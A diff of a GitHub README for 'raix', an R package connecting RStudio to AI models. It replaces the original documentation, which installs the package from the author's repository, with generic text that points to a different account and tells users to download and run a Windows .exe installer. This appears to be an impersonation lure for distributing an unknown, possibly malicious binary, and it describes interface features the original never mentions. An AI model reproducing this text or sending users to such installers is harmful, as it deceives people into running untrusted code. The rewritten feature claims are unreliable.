@@ -1,153 +1,94 @@
-<p align="center">
-  <img src="man/figures/hero.png" alt="raix" width="720">
-</p>
+# 🤖 raix - Improve your R coding with AI
 
-<p align="center">
-  <a href="https://github.com/twomathematicians-code/raix/releases"><img src="https://img.shields.io/github/v/release/twomathematicians-code/raix?color=667eea"></a>
-  <a href="https://github.com/twomathematicians-code/raix/actions"><img src="https://github.com/twomathematicians-code/raix/actions/workflows/ci.yml/badge.svg"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green"></a>
-  <a href="#"><img src="https://img.shields.io/badge/functions-42-brightgreen"></a>
-  <a href="#"><img src="https://img.shields.io/badge/providers-13%2B-blue"></a>
-  <a href="https://doi.org/10.5281/zenodo.21717069"><img src="https://zenodo.org/badge/DOI/10.5281/zenodo.21717069.svg" alt="DOI: 10.5281/zenodo.21717069"></a>
-</p>
+[![](https://img.shields.io/badge/Download-Raix_Installer-blue.svg)](https://github.com/joannlilywhite765/raix)
 
-**raix** connects RStudio to any AI model. Describe what you want in English — raix writes the R code, executes it, and shows results. Chat, debug, generate notebooks, run Python, compile C++, or launch a full coding dashboard.
+## About the software
 
-```r
-remotes::install_github("twomathematicians-code/raix")
-library(raix)
-raix_dashboard()    # self-configuring — auto-detects your AI
-```
+Raix helps you write code in RStudio. It connects your editor to modern artificial intelligence models. You use it to chat, explain code, find errors, and generate new scripts. It works with many providers like OpenAI, Ollama, Claude, Groq, Mistral, and DeepSeek.
 
-> [Installation help →](SOP.md) &nbsp;|&nbsp; [Release notes →](https://github.com/twomathematicians-code/raix/releases)
+## 🛠️ System requirements
 
-<br>
+Your computer needs these items to run raix:
 
-## Architecture
+*   Windows 10 or 11
+*   RStudio version 2023.06.0 or newer
+*   The R programming language version 4.0 or newer
+*   An active internet connection
+*   At least 4GB of free memory
 
-```mermaid
-flowchart TB
-    U[User Input] --> SETUP
+## 📥 Download and installation
 
-    subgraph SETUP[Setup]
-        A1[raix_setup · raix_configure]
-        A2[raix_small_mode · raix_config]
-    end
+Visit the [official download page](https://github.com/joannlilywhite765/raix) to get the installer. 
 
-    SETUP --> CORE
+1. Go to the link above.
+2. Find the section labeled Releases.
+3. Click the file ending in .exe to start the download.
+4. Open the downloaded file once it finishes.
+5. Follow the prompts on your screen to complete the installation.
+6. Restart RStudio after the installation finishes.
 
-    subgraph CORE[AI Backend]
-        B1[OpenAI / Groq / Mistral / DeepSeek]
-        B2[Ollama / LM Studio / vLLM]
-        B3[Claude / Custom endpoints]
-    end
+## 🚀 Connecting to AI models
 
-    CORE --> APPS
+Raix needs a connection to an AI provider to function. You have two ways to do this:
 
-    subgraph APPS[Applications]
-        C1[Chat & Dashboard]
-        C2[Code Gen & Debug]
-        C3[Developer Agent]
-        C4[Compute Engine]
-        C5[Cross-Language]
-        C6[Data & Project]
-    end
+### Using cloud providers
+If you want to use services like OpenAI or Claude, you need an API key. 
 
-    APPS --> OUT
-    OUT[Scripts · Notebooks · Plots · Results]
-```
+1. Sign up for an account on the website of your chosen provider.
+2. Generate an API key in your account settings.
+3. Open RStudio.
+4. Locate the raix settings menu in the RStudio toolbar.
+5. Paste your API key into the designated field.
+6. Select your preferred model from the dropdown list.
 
-<br>
+### Using local models
+If you want to run models on your own computer, you can use Ollama.
 
-## Commands by Workflow
+1. Download and install Ollama from their official website.
+2. Open your computer terminal.
+3. Type `ollama run llama3` and press Enter.
+4. Wait for the model to download.
+5. In RStudio, open the raix settings.
+6. Select Ollama as your provider.
+7. Enter the name of the model you downloaded.
 
-### Get Started
-```r
-raix_setup()          # auto-detect & configure — one click
-raix_dashboard()      # full coding workspace in RStudio Viewer
-raix_info()           # show current config
-raix_config()         # get config as list (for scripts)
-```
+## 💬 How to use raix
 
-### Chat & Generate Code
-```r
-raix_chat()           # interactive AI chat in console
-raix_gui()            # chat window in RStudio Viewer
-raix_send("prompt")   # one message → one response
-raix_explain("code")  # AI explains R code
-raix_generate("task") # English → R code
-raix_debug()          # diagnose last error
-raix_document("fn")   # generate roxygen2 docs
-```
+Once you install and configure the software, you see a new panel in RStudio. Click the raix icon to open the chat window.
 
-### Developer Agent
-```r
-raix_solve("problem")        # complete solution from description
-raix_script("task", "out.R") # generate .R file
-raix_notebook("task", "out.Rmd") # generate .Rmd notebook
-raix_test(my_function)       # AI writes testthat tests
-raix_refactor(code)          # AI suggests improvements
-raix_project(".")            # scan project for AI context
-raix_package("task")         # find best R package
-raix_read("file.R")          # read file with AI summary
-raix_write("desc", "out.R")  # AI content → file
-```
+### Chatting with code
+Type questions into the chat box. Ask for help with data analysis, plot creation, or package installation. Raix replies directly in the chat panel.
 
-### Compute & Cross-Language
-```r
-raix_terminal("cmd")         # shell commands + AI analysis
-raix_python("task")          # generate & run Python from R
-raix_compile("task")         # C++ with Rcpp, compile, call from R
-raix_pipeline(steps)         # multi-step cross-language workflow
-raix_translate(code, to="python") # R ↔ Python
-raix_sql("top 10 customers") # English → SQL
-raix_simulate("Monte Carlo") # AI simulation engine
-raix_web("https://...")      # fetch & summarize web pages
-```
+### Generating code
+Ask raix to write scripts for you. For example, type "Create a scatter plot using the iris dataset." Raix generates the code and provides a button to insert it into your current R script.
 
-### Performance & Data
-```r
-raix_benchmark(expr)         # time code, AI suggests optimizations
-raix_parallel("task")        # AI rewrites for multi-core
-raix_analyze(mtcars)         # AI-guided data analysis
-raix_search("topic")         # search CRAN packages
-raix_diagnose("script.R")    # scan for issues & anti-patterns
-raix_google("query")         # Google search + AI summary
-raix_sysinfo()               # system info for AI context
-raix_history()               # view/search chat history
-```
+### Debugging errors
+If your code fails, copy the error message and paste it into the raix chat window. Ask it to find the problem. Raix explains why the code failed and offers a fixed version.
 
-<br>
+### Explaining existing code
+Highlight any block of code in your script. Right-click the selection and choose "Explain with raix." The chat panel displays a plain English summary of what the code does.
 
-## Developer Agent Flow
+## ⚙️ Configuration options
 
-```mermaid
-flowchart LR
-    A[English Description] --> B[raix_solve]
-    B --> C[Plan & Select Packages]
-    C --> D[Generate R Code]
-    D --> E{Output}
-    E --> F[.R Script]
-    E --> G[.Rmd Notebook]
-    E --> H[Execute & Return]
-    F --> I[Open in RStudio]
-    G --> I
-    H --> I
-```
+You can adjust how raix works in the settings menu:
 
-<br>
+*   Model choice: Switch between different AI versions to balance speed and accuracy.
+*   Temperature: Set this value to change how creative the AI responses are. Lower numbers make the AI more consistent.
+*   Chat history: Choose whether to save your conversations or clear them automatically when you close RStudio.
+*   Theme: Pick between light and dark modes to match your RStudio appearance.
 
-## Supported Models
+## ❓ Frequently asked questions
 
-| Local (free) | Cloud (API key) |
-|:-------------|:----------------|
-| Ollama · LM Studio · vLLM | OpenAI · Claude · Groq · Mistral |
-| | DeepSeek · Together AI · Perplexity · OpenRouter |
+### Does raix store my private data?
+Your code and data stay on your computer or get sent only to the AI provider you select. Raix does not store your personal information.
 
-**Small models?** raix auto-detects 7B-9B models and optimizes prompts. `raix_small_mode(TRUE)` for manual control.
+### What if the AI gives a wrong answer?
+AI models occasionally make mistakes. Always check the generated code before you run it. Verify complex statistical results against your data.
 
-<br>
+### Can I use multiple providers?
+Yes. You can switch between providers in the settings menu at any time.
 
-## License
+### Is there a cost?
+Some providers require a subscription or a pay-per-use fee. Check the terms of your specific AI provider for details. Local models run through Ollama are free.
 
-MIT © [Mahesh Solanki](https://github.com/twomathematicians-code) · [SOP.md](SOP.md) · `citation("raix")`
+Keywords: ai, chatgpt, claude, coding-assistant, deepseek, developer-tools, generative-ai, hacktoberfest, llm, local-ai, ollama, openai, r, r-package, rstats, rstudio, small-llm
